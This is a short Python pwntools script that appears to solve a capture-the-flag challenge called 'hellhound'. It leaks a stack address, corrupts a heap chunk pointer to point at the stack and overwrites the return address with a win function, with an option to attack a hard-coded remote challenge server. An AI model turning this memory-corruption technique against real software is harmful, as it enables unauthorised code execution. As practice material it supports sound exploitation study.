#!/usr/bin/env python3
#16-05-2022
#Gon
#ret2win
#heap to stack

from pwn import *
exe = ELF('./hellhound_patched')

context.binary = exe
context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote('138.68.188.223', 31348)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io

def leak():
    io.sendlineafter(b'>> ', b'1')

#write some code, write 0x20 into malloc(0x40)
def edit(data):
    io.sendlineafter(b'>> ', b'2')
    io.sendafter(b'code: ', data)

#Choice 3: change ptr with chunk first 8 bytes
def check():
    io.sendlineafter(b'>> ', b'3')

#Choice 69: free chunk
def free():
    io.sendlineafter(b'>> ', b'69')

#berserk_mode_off cat flag
io = conn()

#Get heap chunk ptr
leak()
io.recvuntil(b'number: [')
stack = int(io.recvuntil(b']', drop=True), 10)
info("Stack:%#x", stack)

#write into heap chunk
edit(p64(0) + p64(stack - 0x8))

#Change chunk ptr with chunk value
check()

#write ret2win function into stack
edit(p64(exe.sym.berserk_mode_off))

io.interactive()
